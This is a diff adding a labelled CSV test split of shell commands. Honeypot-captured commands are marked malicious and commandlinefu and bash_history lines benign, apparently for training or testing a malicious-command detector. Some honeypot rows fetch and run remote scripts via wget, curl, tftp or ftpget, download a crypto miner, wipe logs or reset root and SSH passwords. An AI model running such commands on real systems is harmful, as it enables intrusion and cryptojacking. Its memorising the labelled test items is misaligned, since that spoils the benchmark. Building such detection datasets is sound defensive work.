@@ -1,0 +1,1916 @@
+id,command,label,source,split
+d2_000000,nano u.txt,1,honeypot,test
+d2_000001,"perl -wlne'/title>([^<]+)/i&&rename$ARGV,""$1.html""' *.html",0,commandlinefu,test
+d2_000010,"example() { echo ""EXAMPLE:""; echo; echo "" $@""; echo; echo ""OUTPUT:""; echo ; eval ""$@"" | sed 's/^/ /'; }",0,commandlinefu,test
+d2_000014,"sleep 4; xwd >foo.xwd; mv foo.xwd ""$(dd skip=100 if=foo.xwd bs=1 count=256 2>/dev/null | egrep -ao '^[[:print:]]+' | tr / :).xwd""",0,commandlinefu,test
+d2_000016,Zsh,0,bash_history,test
+d2_000026,"mysqldump --add-drop-table --extended-insert --force --log-error=error.log -uUSER -pPASS OLD_DB_NAME | ssh -C user@newhost ""mysql -uUSER -pPASS NEW_DB_NAME""",0,commandlinefu,test
+d2_000040,/bin/busybox echo -e '\x47\x72\x6f\x70/sys/firmware' > /sys/firmware/.nippon,1,honeypot,test
+d2_000050,sudo nmap -sS 27.127.252.61 -D 168.95.110.156,0,commandlinefu,test
+d2_000056,check_mk -v -p --debug -D --checks local control2.gate.rtf,0,bash_history,test
+d2_000066,vi ./bashrc,0,bash_history,test
+d2_000067,./.dhpcd,1,honeypot,test
+d2_000071,31m>>>> Server Gasit incepem Testele \033[1,1,honeypot,test
+d2_000085,dpigs,0,commandlinefu,test
+d2_000088,/gisdfoewrsfdf,1,honeypot,test
+d2_000102,find -type f -mtime -40 -ls,0,bash_history,test
+d2_000108,"ls -alt|awk '{if (system(""sleep .5 && exit 2"") != 2) exit; print}'",0,commandlinefu,test
+d2_000111,git remote add originster/New-1,0,bash_history,test
+d2_000112,cp ~/.functions bash/,0,bash_history,test
+d2_000122,cat /dev/null > /var/log/yum.log,1,honeypot,test
+d2_000124,./nf88BWF9,1,honeypot,test
+d2_000132,tar -zxvf mongodb-linux-x86_64-ubuntu1604-4.0.5.tgz,0,bash_history,test
+d2_000141,who | gzip | base64,1,honeypot,test
+d2_000143,rm -rf /var/tmp/dota*,1,honeypot,test
+d2_000152,sudo arp-scan -I eth0 75.52.247.61/24,0,commandlinefu,test
+d2_000154,man cruft,0,bash_history,test
+d2_000163,sudo systemctl restart jenkins,0,bash_history,test
+d2_000165,oc set volume dc/tasks --add --name=jboss-config --mount-path=/opt/eap/standalone/configuration/application-users.properties --sub-path=application-users.properties --configmap-name=tasks-config -n abi-tasks-dev,0,bash_history,test
+d2_000186,brew uninstall --force openssl,0,bash_history,test
+d2_000211,tar -zxvf 'download (1)',0,bash_history,test
+d2_000217,./ygljglkjgfg0,1,honeypot,test
+d2_000218,bash -c ./ptUehrfk,1,honeypot,test
+d2_000239,sudo apt-get install parallel,0,bash_history,test
+d2_000241,netctl-auto disable,0,bash_history,test
+d2_000242,cat tmp.rwG6eULB7M.sh,1,honeypot,test
+d2_000250,ls Init/,0,bash_history,test
+d2_000251,"echo ""cd /tmp ; wget http://h060a0744.example.net/wget.sh || curl http://h060a0744.example.net/curl.sh -o curl.sh ; chmod +x *.sh ; ./wget.sh ; ./curl.sh"" | sh",1,honeypot,test
+d2_000252,"for i in {1..30}; do ping -t $i -c 1 google.com; done | grep ""Time to live exceeded""",0,commandlinefu,test
+d2_000254,sudo makedir /media/mobilehd,0,bash_history,test
+d2_000255,gs -dNOPAUSE -sDEVICE=jpeg -r144 -sOutputFile=p%03d.jpg file.pdf,0,commandlinefu,test
+d2_000264,alias ..='cd ..',0,commandlinefu,test
+d2_000269,unzip nasa.zip,1,honeypot,test
+d2_000272,"color()(set -o pipefail;""$@"" 2>&1>&3|sed $'s,.*,\e[31m&\e[m,'>&2)3>&1",0,commandlinefu,test
+d2_000273,"growisofs -M /dev/dvd -J -r ""directory name with files to add to DVD""",0,commandlinefu,test
+d2_000276,ls samsung/,0,bash_history,test
+d2_000278,tail -f /path/to/timestamped/files/file-*(om[1]),0,commandlinefu,test
+d2_000294,"echo -en ""stats\r\n"" ""quit\r\n"" | nc localhost 11211 | tr -s [:cntrl:] "" ""| cut -f42,48 -d"" "" | sed ""s/\([0-9]*\)\s\([0-9]*\)/ \2\/\1*100/"" | bc -l",0,commandlinefu,test
+d2_000299,nproo,1,honeypot,test
+d2_000300,make prefix=/usr/local/git all,0,bash_history,test
+d2_000302,grep 1000 /isiseqruns/RonAxoTrinity/AxoMikeTest/*.sh,0,bash_history,test
+d2_000304,less Trolltech.conf,0,bash_history,test
+d2_000309,spotify,0,bash_history,test
+d2_000327,feh -F ndriod.pic/mmexport1385385807785.jpeg,0,bash_history,test
+d2_000328,tftp -r tftp2.sh -g 21.183.167.151,1,honeypot,test
+d2_000333,sudo apt install jd,0,bash_history,test
+d2_000336,ls -1 /etc/pam.d,1,honeypot,test
+d2_000356,composer selfupdate,0,bash_history,test
+d2_000368,rm -fr perl-5.10.0*,0,bash_history,test
+d2_000373,chr () { printf \\$(($1/64*100+$1%64/8*10+$1%8)); },0,commandlinefu,test
+d2_000386,for var in $(env | grep TF | awk -F\= '{print $1}'); do export $var; done,0,bash_history,test
+d2_000407,git pull -u suresh prod,0,bash_history,test
+d2_000409,sudo pacman -S gvfs,0,bash_history,test
+d2_000411,/bin/busybox cat /proc/sched_debug/.nippon,1,honeypot,test
+d2_000418,rpm -e --allmatches filename.rpm,0,commandlinefu,test
+d2_000426,iptables -t nat -A POSTROUTING -p tcp --dport 25 -j SNAT --to-source IP_TO_ROUTE_THROUGH,0,commandlinefu,test
+d2_000428,for i in *mkv; do ffmpeg -i $i -vcodec copy -acodec copy $i.mp4; done,0,bash_history,test
+d2_000432,ps -el,0,bash_history,test
+d2_000437,sudo pkill -9 dhclient,0,bash_history,test
+d2_000444,for host in `grep 127 ad_servers.txt | awk '{ print $2 }'`;do echo $host;done,0,bash_history,test
+d2_000446,"step2(){ b=""GET&https%3A%2F%2Fstream.twitter.com%2F1%2Fstatuses%2Ffilter.json&follow%3D${id}%26oauth_consumer_key%3D${k1}%26oauth_nonce%3D${once}%26oauth_signature_method%3DHMAC-SHA1%26oauth_timestamp%3D${ts}%26oauth_token%3D${k3}%26oauth_version%3D1.0"";}",0,commandlinefu,test
+d2_000450,cat i3log* 2> /dev/null | tail,0,bash_history,test
+d2_000451,sudo pkill -QUIT obex,0,bash_history,test
+d2_000457,git checkout evaluating,0,bash_history,test
+d2_000470,exercicio1403,0,bash_history,test
+d2_000472,rails generate paperclip About image,0,bash_history,test
+d2_000477,cp ~/Downloads/Book2.csv ./korea.csv,0,bash_history,test
+d2_000479,cc -o b tcp2.c,0,bash_history,test
+d2_000481,rm -rf /usr/bin/python,0,bash_history,test
+d2_000483,docker -H ssh://es012.metriks.prod.s1.p.fti.net ps | grep securite_es-master,0,bash_history,test
+d2_000484,xz,1,honeypot,test
+d2_000490,git config --Muedkhn@gmail.com,0,bash_history,test
+d2_000504,git help commit,0,bash_history,test
+d2_000508,python ldr2.0,0,bash_history,test
+d2_000519,sudo systemctl restart network-manager.service,0,bash_history,test
+d2_000522,wget http://h7642432e.example.net/hxx,1,honeypot,test
+d2_000524,ls /home/liveuser,0,bash_history,test
+d2_000526,vim for,0,bash_history,test
+d2_000535,git branch --help,0,bash_history,test
+d2_000539,sudo pip install asgi_redis,0,bash_history,test
+d2_000541,rm -rf read.txt*,1,honeypot,test
+d2_000542,wget <URL> -O- | wget -i -,0,commandlinefu,test
+d2_000543,sudo git remote add githubstello/presto.git,0,bash_history,test
+d2_000551,./VEYWaqHT,1,honeypot,test
+d2_000552,chmod 0777 syn2023,1,honeypot,test
+d2_000563,rm .xinitrc.swp,0,bash_history,test
+d2_000565,/bin/busybox cat /proc/sysrq-trigger/.nippon,1,honeypot,test
+d2_000574,/bin/busybox cat /proc/keys/.none,1,honeypot,test
+d2_000575,imv book_main.tex,0,bash_history,test
+d2_000576,ansible web-servers -m setup -a 'filter=ansible_distribution',0,bash_history,test
+d2_000577,git checkout develop,0,bash_history,test
+d2_000578,./mysemant_b grading/staticdispatch.test > out,0,bash_history,test
+d2_000582,"oc new-app --name='blue' --labels=name=""blue"" phps",0,bash_history,test
+d2_000596,"sudo find / -iname ""*.lproj"" -and \! -iname ""en*"" -print0 | tee /dev/stderr | sudo xargs -0 rm -rfv",0,commandlinefu,test
+d2_000599,"echo ""fjadjfjadfjadk"" > abfda.pngfdaffdfdafasdfa",0,bash_history,test
+d2_000602,git remote add origins-out.git,0,bash_history,test
+d2_000604,sudo chmod -R o+r *,0,bash_history,test
+d2_000607,/bin/busybox rm -f /etc/hostname/.nippon,1,honeypot,test
+d2_000608,sudo /edx/app/edxapp/edx-platform/openedx/core/djangoapps/content/course_overviews/models.py,0,bash_history,test
+d2_000611,"function avg { awk ""/$2/{sum += \$$1; lc += 1;} END {printf \""Average over %d lines: %f\n\"", lc, sum/lc}""; }",0,commandlinefu,test
+d2_000622,source /home/bjohnston/env/mine/bin/activate,0,bash_history,test
+d2_000628,rm -rf sh,1,honeypot,test
+d2_000635,openssl rand -hex 6 | sed 's/\(..\)/\1:/g; s/.$//',0,commandlinefu,test
+d2_000641,sudo apt install textinfo,0,bash_history,test
+d2_000649,sshfs /root/Desktop/mountdirectory root@remotehost:/etc/,0,commandlinefu,test
+d2_000650,"touch {x,y}.ex",0,bash_history,test
+d2_000655,alias ds='dig +noauthority +noadditional +noqr +nostats +noidentify +nocmd +noquestion +nocomments',0,commandlinefu,test
+d2_000665,bash quiz.sh,0,bash_history,test
+d2_000667,apt-get -s upgrade | awk '/Inst.+/ {print $2}',0,commandlinefu,test
+d2_000668,less DOOMICIDE\ darkocean,0,bash_history,test
+d2_000669,cd /var/tmp wget ftp://hc8870bf9.example.net/.mr,1,honeypot,test
+d2_000682,pkill -f cyber,1,honeypot,test
+d2_000686,yaourt -v,0,bash_history,test
+d2_000690,hardlink -vpot .,0,commandlinefu,test
+d2_000711,./u40iqkxK,1,honeypot,test
+d2_000713,rm -rf /tmp/playlist.tmp && find ~/mp3 -name *.mp3 > /tmp/playlist.tmp && mplayer -playlist /tmp/playlist.tmp -shuffle -loop 0 | grep Playing,0,commandlinefu,test
+d2_000716,function checkfor () { while :; do $*; sleep 5; done; },0,commandlinefu,test
+d2_000719,"while true; do input tap $(wm size | awk -F 'x' '{print $1/2 "" "" $2/2}'); done",0,commandlinefu,test
+d2_000720,find / -type f 2>/dev/null | xargs du 2>/dev/null | sort -n | tail -n 10 | cut -f 2 | xargs -n 1 du -h,0,commandlinefu,test
+d2_000725,git rev-list --all|tail -n1|xargs git show|grep -v diff|head -n1|cut -f1-3 -d' ',0,commandlinefu,test
+d2_000727,chroot --help,0,bash_history,test
+d2_000731,sudo pm-suspend,0,commandlinefu,test
+d2_000733,puppet resource user developer password=4linux,0,bash_history,test
+d2_000735,~<TAB>,0,commandlinefu,test
+d2_000738,chmod 777 3Update.sh,1,honeypot,test
+d2_000750,mv store_data/ data_result,0,bash_history,test
+d2_000757,ls /sys/class/hwmon/hwmon0/device/,0,bash_history,test
+d2_000759,xmodmap -e 'remove Lock = Caps_Lock' && xmodmap -e 'add control = Caps_Lock',0,commandlinefu,test
+d2_000762,ssh -f user@remote.ip DISPLAY=:0.0 smplayer movie.avi,0,commandlinefu,test
+d2_000769,ll /lib,0,bash_history,test
+d2_000770,tmp=$(wpa_cli scan_result | awk {'print $5'} | awk 'NR > 2' | grep -oFf <(wpa_cli list_networks | awk {'print $2'} | awk 'NR > 2') | grep -vFf - <(wpa_cli scan_results | awk {'print $5'} | awk 'NR > 2'),0,bash_history,test
+d2_000776,set|grep -i tmout,0,bash_history,test
+d2_000780,brew uninstall net-snmp,0,bash_history,test
+d2_000781,git gommit -m 'initial commit',0,bash_history,test
+d2_000790,lynx localhost,0,bash_history,test
+d2_000795,tar xvf miner.tar,1,honeypot,test
+d2_000796,make check,0,bash_history,test
+d2_000798,ifconfig | convert label:@- ip.png,0,commandlinefu,test
+d2_000814,sh 18064.sh,1,honeypot,test
+d2_000817,distance,1,honeypot,test
+d2_000820,nslookup cnn.com 27.75.34.196,0,bash_history,test
+d2_000833,sort -F kp.txt,0,bash_history,test
+d2_000846,var=host ;while ! nc -zw 1 $var 22;do sleep 1; done ; ssh user@$var,0,commandlinefu,test
+d2_000847,whereis jenkins,0,bash_history,test
+d2_000851,"od -An -w999 -t xC <<< ""$1"" | sed 's/[ ]\?\(c[23]\) \(..\)/%\1%\2/g;s/ /\\\\\x/g' | xargs echo -ne",0,commandlinefu,test
+d2_000854,ls /var/cache/apt/archives/,0,bash_history,test
+d2_000855,./C4uaUKSn,1,honeypot,test
+d2_000857,alias allvars=' ( set -o posix; set ) | less',0,commandlinefu,test
+d2_000859,[DEBUG][2016-08-14 15:41:39] => Success Insert Article => 서울교육대학교 음악교육과_제52회 전국초등학생음악경연대회,0,bash_history,test
+d2_000865,chmod +x sshdsservers,1,honeypot,test
+d2_000882,rm -rf run,0,bash_history,test
+d2_000891,darkness,1,honeypot,test
+d2_000895,vim abstract.tex,0,bash_history,test
+d2_000901,./zombie.c,0,bash_history,test
+d2_000904,/bin/busybox rm /proc/kcore/.none,1,honeypot,test
+d2_000910,mysql -u root -o,0,bash_history,test
+d2_000920,sudo rmmod rtsx_pci_sdmmc,0,bash_history,test
+d2_000921,cp db/migrate/20150522135851_add_attachment_image_to_sliders.rb db/migrate/20150522135852_add_attachment_image_to_abouts.rb,0,bash_history,test
+d2_000922,cp /usr/share/doc/cowsay/examples/cowsay_random .,0,bash_history,test
+d2_000924,usermod -aG sudo ecollect,0,bash_history,test
+d2_000937,head -v -n 8 /proc/meminfo,1,honeypot,test
+d2_000940,wgetsite-on-aws/raw/master/config.zip -O tf.zip,0,bash_history,test
+d2_000941,rm git,0,bash_history,test
+d2_000948,account,0,bash_history,test
+d2_000953,wget http://h1812cd2f.example.net/Pemex.sh,1,honeypot,test
+d2_000958,sh bin2.sh,1,honeypot,test
+d2_000983,sudo a2ensite python-web,0,bash_history,test
+d2_000991,rm AddView.c,0,bash_history,test
+d2_000997,rsync -e 'ssh -p PORT' user@host:SRC DEST,0,commandlinefu,test
+d2_000999,chmod u+x syn2023,1,honeypot,test
+d2_001000,iostat -xckd 2,0,bash_history,test
+d2_001001,find -name test_*,0,bash_history,test
+d2_001016,ls $(grep cifs /etc/fstab | grep -v ^# |awk ' { print $2 } ') 1>/dev/null,0,commandlinefu,test
+d2_001023,bundle exec rake cucumber,0,bash_history,test
+d2_001024,updatedb &,0,bash_history,test
+d2_001034,url -fsSL http://ha1e67547.example.net/2start.jpg | bash -sh,1,honeypot,test
+d2_001044,ssh client-Node-1,0,bash_history,test
+d2_001048,ؤي /edx/app/edxapp/themes/raccoongang_theme/marvel-theme-ginkgo/lms/templates/courseware,0,bash_history,test
+d2_001049,sudo apt-get install emacs,0,bash_history,test
+d2_001050,"tar xzvf m,ix.tgz",1,honeypot,test
+d2_001064,sudo chown -R schoolmom:schoolmom ./,0,bash_history,test
+d2_001074,du -hd1 | sort -hr,0,commandlinefu,test
+d2_001081,"mplayer -dumpstream -dumpfile ""yourfile"" -playlist ""URL""",0,commandlinefu,test
+d2_001083,cat fx19.x86 > sshserverruntime,1,honeypot,test
+d2_001086,cp -r views /var/www/modules,0,bash_history,test
+d2_001087,rm -rf kbk,1,honeypot,test
+d2_001091,cat config/routes.rb,0,bash_history,test
+d2_001095,sysctl dev.cpu.0.freq_levels,0,commandlinefu,test
+d2_001098,find . |grep brctl,0,bash_history,test
+d2_001103,function cpaste () { gpg -o - -a -c $1 | curl -s -F 'sprunge=<-' http://h83c30c6f.example.net } function dpaste () { curl -s $1 | gpg -o - -d },0,commandlinefu,test
+d2_001106,sudo docker rm e6286832b876,0,bash_history,test
+d2_001111,cd Desktop,1,honeypot,test
+d2_001116,head -100000 /dev/urandom | strings > temp.txt && for w in $(cat webster-dictionary.txt); do if [ ${#w} -gt 3 ]; then grep -io $w temp.txt; fi; done,0,commandlinefu,test
+d2_001126,tee >(cat - >&2),0,commandlinefu,test
+d2_001132,./V6OuGvO9,1,honeypot,test
+d2_001139,./mesos-migrate-dc.py --colddc sqainfra --hotdc sqainfra --ratelimit 2,0,bash_history,test
+d2_001149,cat /etc/rc.local,0,bash_history,test
+d2_001150,sudo apt-get install maven3,0,bash_history,test
+d2_001161,/bin/busybox echo -e '\x47\x72\x6f\x70/proc/irq' > /proc/irq/.nippon,1,honeypot,test
+d2_001162,rm -fr 撣�霈堆��券餈賜�.2014.銝剛摮�嚙。MCT甇颱滿撉ㄚ/,0,bash_history,test
+d2_001173,ftpget -v -u anonymous -p anonymous -P 21 abzyobl.zapto.org ftp1.sh ftp1.sh,1,honeypot,test
+d2_001181,chmod 777 syn2023,1,honeypot,test
+d2_001187,Ei3b,0,bash_history,test
+d2_001189,rndc --gelp,0,bash_history,test
+d2_001195,git config colou.ui true,0,bash_history,test
+d2_001199,ifconfig eth0 7.98.246.159 7.98.246.159 && dhclient eth dhcp,0,commandlinefu,test
+d2_001200,sudo echo full-speed > /proc/acpi/ibm/fan,0,bash_history,test
+d2_001204,./FXVwTWAQ,1,honeypot,test
+d2_001207,chmod 777 loligang.arm,1,honeypot,test
+d2_001215,ssh octonode_rsa.pub,0,bash_history,test
+d2_001222,:wq,0,bash_history,test
+d2_001229,setuserpasswd root VivBPucWpUL,1,honeypot,test
+d2_001230,arp -e,0,bash_history,test
+d2_001231,"for i in */; do echo tar -cjf ""${i%/}.tar.bz2"" ""$i""; done",0,commandlinefu,test
+d2_001232,wget https://h8fe31bb0.example.net/BrxX/xmrig,1,honeypot,test
+d2_001236,curl -O http://h5f4946c0.example.net/8UsA.sh,1,honeypot,test
+d2_001237,yaourt artwiz,0,bash_history,test
+d2_001254,"awk '{print $3,$2,$1}' RS=""\n\n"" FS=""\n"" OFS="","" filename.txt",0,commandlinefu,test
+d2_001261,cat ~/arandr.sh,0,bash_history,test
+d2_001264,git checkout clmb/protoype,0,bash_history,test
+d2_001265,hbase shell,0,bash_history,test
+d2_001274,catalin123@,1,honeypot,test
+d2_001279,rm MyNewProject/ -rf,0,bash_history,test
+d2_001285,oc set build-secret --source bc/tasks-pipeline gogs-secret -n abi-jenkins,0,bash_history,test
+d2_001287,"perl -Mojo -E 'say g(""http://ha20fa670.example.net/popclock/data/population/world"")->json->{'world'}{'population'};'",0,commandlinefu,test
+d2_001289,sudo ls /etc/openvpn/client,0,bash_history,test
+d2_001290,ps -ef|grep nginx,0,bash_history,test
+d2_001291,cd /usr/bin/,1,honeypot,test
+d2_001295,j voya,0,bash_history,test
+d2_001296,sudo shred -vz -n 0 /dev/sdb,0,commandlinefu,test
+d2_001298,sudo ./update_theme.shs_for_themex.io.git,0,bash_history,test
+d2_001299,git config --global core.excludesfile ~/.gitignore_global,0,bash_history,test
+d2_001300,nache2015,1,honeypot,test
+d2_001301,chmod 777 typpaostur.sh,1,honeypot,test
+d2_001306,rails g model Contact,0,bash_history,test
+d2_001309,chmod +x case,0,bash_history,test
+d2_001311,alias beats='echo '\''@'\''$(TZ=GMT-1 date +'\''(%-S + %-M * 60 + %-H * 3600) / 86.4'\''|bc)',0,commandlinefu,test
+d2_001315,[goalador@gatanda hhneuauf.de]$ gatanda hhneuauf.de]$,0,bash_history,test
+d2_001320,"find . -name '*.?pp' -exec grep -H ""string"" {} \;",0,commandlinefu,test
+d2_001321,git add sum,0,bash_history,test
+d2_001325,yaourt aria,0,bash_history,test
+d2_001328,svn add `svn status | grep ? | cut -c9-80`,0,commandlinefu,test
+d2_001329,arch,0,commandlinefu,test
+d2_001335,yum install wget -y,1,honeypot,test
+d2_001342,tftp -r tssh2.sh -g 127.173.194.220,1,honeypot,test
+d2_001343,/bin/busybox rm -f /sys/fs/cgroup/cpuset/.nippon,1,honeypot,test
+d2_001344,ffserver,0,bash_history,test
+d2_001348,"box() { l=${#1}+4;x=${2:-=};n $l $x; echo ""$x $1 $x""; n $l $x; }; n() { for (( i=0; $i<$1; i=$i+1)); do printf $2; done; printf ""\n""; }",0,commandlinefu,test
+d2_001354,find . |grep package,0,bash_history,test
+d2_001356,chmod u+x ./ldr,0,bash_history,test
+d2_001358,git add c.py,0,bash_history,test
+d2_001363,smb,0,bash_history,test
+d2_001364,du -h Downloads/,0,bash_history,test
+d2_001366,du -hL --max-depth=1,0,commandlinefu,test
+d2_001368,mpiicc -E src/dim3_sweep.c,0,bash_history,test
+d2_001372,wget -e robots=off --mirror --convert-links --adjust-extension --page-requisites --recursive --no-parent www.example.com,0,commandlinefu,test
+d2_001388,sudo vim lightdm-gtk-greeter.conf,0,bash_history,test
+d2_001397,cd PID,1,honeypot,test
+d2_001400,xvkbd -xsendevent -text $(date +%Y%m%d),0,commandlinefu,test
+d2_001405,vi /etc/locale.conf,0,bash_history,test
+d2_001409,rm /tmp/foo,1,honeypot,test
+d2_001411,wget -r -l1 -H -t1 -nd -N -np -A.mp3 -erobots=off -i ~/sourceurls.txt,0,commandlinefu,test
+d2_001421,"find . -type f -regex "".*/core.[0-9][0-9][0-9][0-9]$""",0,commandlinefu,test
+d2_001424,tcpdump -nli eth0; tcpdump -nli eth0 src or dst w.x.y.z; tcpdump -nli eth0 port 80; tcpdump -nli eth0 proto udp,0,commandlinefu,test
+d2_001434,vim menu.c,0,bash_history,test
+d2_001449,gcc main.c -g,0,bash_history,test
+d2_001451,sh bin.sh,1,honeypot,test
+d2_001458,markdown doc.md >/tmp/md.$$.html && firefox -new-tab /tmp/md.$$.html >/dev/null 2>&1 && rm -f /tmp/md.$$.html,0,commandlinefu,test
+d2_001467,python start_robot,0,bash_history,test
+d2_001471,ls -lrth,0,bash_history,test
+d2_001500,pkill -n firefox,0,commandlinefu,test
+d2_001501,cat starttime.txt,0,bash_history,test
+d2_001514,sh bin/overcloud-deploy.sh,0,bash_history,test
+d2_001520,wget -c -t 1 --load-cookies ~/.cookies/rapidshare <URL>,0,commandlinefu,test
+d2_001528,less +F somelogfile,0,commandlinefu,test
+d2_001532,synoservicectl --restart sshd,0,commandlinefu,test
+d2_001536,apt-cyg install git,0,bash_history,test
+d2_001546,cat nss,0,bash_history,test
+d2_001549,export BLOCKSIZE='sudo blockdev --getsize64 /dev/sdc' && sudo dd if=/dev/sdc bs=1MB | pv -s $BLOCKSIZE | gzip -9 > USB_SD_BACKUP.img.gz,0,commandlinefu,test
+d2_001550,ll /var/lib/cloud/scripts/per-instance,0,bash_history,test
+d2_001564,fswebcam /home/pi/image.jpg -v -r 800x400 --set brightness=72% --set contrast=24% --title 'Partyzone Cam 1' --save /home/pi/image.jpg,0,bash_history,test
+d2_001566,npm install swiper,0,bash_history,test
+d2_001574,ntpdate,0,bash_history,test
+d2_001587,suso s,0,bash_history,test
+d2_001593,echo $(cd $(dirname $0);pwd),0,bash_history,test
+d2_001598,[goalador@gatanda hhneuauf.de]$ [goalador@gatanda hhneuauf.de]$ [goalador@gatanda hhneuauf.de]$ da hhneuauf.de]$ [goalador@gatanda hhneuauf.de]$ [CHG] Controller C8:F7:33:33:E2:F7 UUIDs: 0000110b-0000-1000-8000-00805f9b34fb,0,bash_history,test
+d2_001601,mutt_dotlock -t,0,bash_history,test
+d2_001609,"sudo nvram boot-args=""-v""",0,commandlinefu,test
+d2_001623,cat web.config,0,bash_history,test
+d2_001631,tftp -r t8UsA2.sh -g 164.35.16.182,1,honeypot,test
+d2_001637,sudo apt-get install vim,0,bash_history,test
+d2_001643,37m ' ; '%(latency)s ms\033[1,1,honeypot,test
+d2_001647,"curl -s ""http://hdc5283a9.example.net/avatar/`uuidgen | md5sum | awk '{print $1}'`?s=64&d=identicon&r=PG"" | display",0,commandlinefu,test
+d2_001660,"for i in `pfiles pid|grep S_IFREG|awk '{print $5}'|awk -F"":"" '{print $2}'`; do find / -inum $i |xargs ls -lah; done",0,commandlinefu,test
+d2_001661,"find ~/bin/ -name ""*sh"" -print0 | xargs -0t tar -zcvf foofile.tar.gz",0,commandlinefu,test
+d2_001668,sudo apt-get install gulp,0,bash_history,test
+d2_001681,sudo apt install mpich,0,bash_history,test
+d2_001684,roscd learning_tf/,0,bash_history,test
+d2_001686,./VOduCV8J,1,honeypot,test
+d2_001688,perl zu,1,honeypot,test
+d2_001690,ffmpeg -acodec copy -vcodec copy -ss 00:05:00 -t 00:20:00 -i file.mp4 file_cropped.mp4,0,commandlinefu,test
+d2_001693,lbgrader list --course data301,0,bash_history,test
+d2_001700,printf '*%.s' {1..40}; echo,0,commandlinefu,test
+d2_001703,wlcear,1,honeypot,test
+d2_001704,cd /mnt/old && tar cvf - . | ( cd /mnt/new && tar xvf - ),0,commandlinefu,test
+d2_001709,"dir=$(pwd); while [ ! -z ""$dir"" ]; do ls -ld ""$dir""; dir=${dir%/*}; done; ls -ld /",0,commandlinefu,test
+d2_001712,./ys808e,1,honeypot,test
+d2_001713,echo $((RANDOM%256)).$((RANDOM%256)).$((RANDOM%256)).$((RANDOM%256)),0,commandlinefu,test
+d2_001728,sudo apt-get install kdenlive,0,bash_history,test
+d2_001729,mkdir -p /mnt/ext3/liveuser,0,bash_history,test
+d2_001730,sudo ./wifite,0,bash_history,test
+d2_001735,sh /tmp/jeSjax,1,honeypot,test
+d2_001736,cat include/builddefs.in,0,bash_history,test
+d2_001738,ls ../samba/setup/,0,bash_history,test
+d2_001746,./utILYqaW,1,honeypot,test
+d2_001748,pam-auth-update,1,honeypot,test
+d2_001749,./HaLGmypP,1,honeypot,test
+d2_001750,sh Tadaa.sh,1,honeypot,test
+d2_001751,sudo apt-get install p7zip-rar p7zip-full unace unrar zip unzip sharutils rar uudeview mpack arj cabextract file-roller,0,commandlinefu,test
+d2_001757,mv .dotfiles .dots,0,bash_history,test
+d2_001758,vi scriptotavio,0,bash_history,test
+d2_001759,flash set SSH_PASSWORD c6bnrTNheEod,1,honeypot,test
+d2_001762,"gustav0b@lo:~$ test ""$user"" = ""redes"" && echo ""user: $user"" || echo ""user: errad o""",0,bash_history,test
+d2_001766,chown -R tomas:tomas ~/.ssh,0,bash_history,test
+d2_001783,"git update-index --assume-unchanged ""app-ios/app-ios/Views/Meeting Detail/MeetingDetailsView.swift""",0,bash_history,test
+d2_001784,mahout --help,0,bash_history,test
+d2_001790,./FWktWW8a,1,honeypot,test
+d2_001793,rm -r .litecoin/,0,bash_history,test
+d2_001795,seq -f %g 10,0,bash_history,test
+d2_001798,git branch -rm remotes/suresh/dev,0,bash_history,test
+d2_001801,i2c --help,0,bash_history,test
+d2_001808,toucj dummy,0,bash_history,test
+d2_001812,ls -ld,0,bash_history,test
+d2_001817,ssh git@gitlab.digiprojects.top -p 806 echo \$PATH,0,bash_history,test
+d2_001823,./kafka-topics.sh --list --zookeeper localhost:2181,0,bash_history,test
+d2_001824,cut -c 4-10 gisteren3,0,bash_history,test
+d2_001840,> [goalador@gatanda corpwebsite-starterkit]$ bash: [goalador@gatanda: command not found,0,bash_history,test
+d2_001844,mdk d config rm %%_grafana_ldap,0,bash_history,test
+d2_001845,mv knife.rb cookbooks/mycookbook/.chef/,0,bash_history,test
+d2_001846,"history | awk '{a[$2]++}END{for(i in a){print a[i] "" "" i}}' | sort -rn | head",0,commandlinefu,test
+d2_001847,runpy xml.etree.cElementTree,0,bash_history,test
+d2_001855,make babymarvel2,0,bash_history,test
+d2_001859,chmod +x maven.sh,0,bash_history,test
+d2_001866,"sudo hwclock --set --date ""08/16/2011 18:32:30""",0,bash_history,test
+d2_001870,git remote add origin glafkv@delmar.umsl.edu:projectname.git,0,bash_history,test
+d2_001876,ls -l | grep ^d | sed 's:.*\ ::g',0,commandlinefu,test
+d2_001883,man sbcl,0,bash_history,test
+d2_001886,rm 2014-09-01-060915_1920x1080_scrot.png,0,bash_history,test
+d2_001890,ls -1 | rename 's/\ /_/',0,commandlinefu,test
+d2_001891,find . -type f -iname '*.mp3' -exec cp {} ~/mp3/ \;,0,commandlinefu,test
+d2_001892,./dmcli eRT getv Device. |grep Moca,0,bash_history,test
+d2_001895,"open R,""curl -s http://h1025fe5c.example.net/Command-line-fu|xml2|""; while(<R>){ chomp; m(^/rss/channel/item/title=) and do{ s/^.*?=//; ($t,$d,$l)=($_,undef,undef) }; m(^/rss/channel/item/description=) and do{ s/^.*?=//; push @d,$_ }; m(^/rss/channel/item",0,commandlinefu,test
+d2_001904,sudo rm -rf /etc/systemd/system/mongod.service,0,bash_history,test
+d2_001914,useradd -p abmpmMZ1K/xOE alex,0,bash_history,test
+d2_001918,rm -rf /var/tmp/.var03522123,1,honeypot,test
+d2_001922,urxvt --help 2>&1| sed -n '/: /s/^ */! URxvt*/gp' >> ~/.Xresources,0,bash_history,test
+d2_001928,$ yum install bind-utils,0,bash_history,test
+d2_001934,wget http://h7d766682.example.net/key.tgz,1,honeypot,test
+d2_001937,apt-get install lighttpd,0,bash_history,test
+d2_001939,tar xvf dofailed: Connection refused.,1,honeypot,test
+d2_001941,cd /var/run,1,honeypot,test
+d2_001949,git remote add origins.top:20443/dev/nikki.git,0,bash_history,test
+d2_001952,chomd 777,0,bash_history,test
+d2_001961,cat thomas.sh,0,bash_history,test
+d2_001964,paplay --help,0,bash_history,test
+d2_001967,chmod u+x scriptrabalho,0,bash_history,test
+d2_001976,alias whichall='{ command alias; command declare -f; } | command which --read-functions --read-alias -a',0,commandlinefu,test
+d2_001977,"/usr/bin/lynx -dump -width 500 http://h4b84b15b.example.net/whm-server-status | awk 'BEGIN { FS = "" "" } ; { print $12 }' | sed '/^$/d' | sort | uniq -c | sort -n",0,commandlinefu,test
+d2_001984,reboot && exit,0,bash_history,test
+d2_001992,cd 64,1,honeypot,test
+d2_001993,du -sch 120717_rerunSSprimaryhepmicroRNA_00093_Evita/Data/,0,bash_history,test
+d2_001996,./k1n74Z8p,1,honeypot,test
+d2_001998,rm -rf Pemex.sh Pemex.sh Pemex2.sh Pemex1.sh,1,honeypot,test
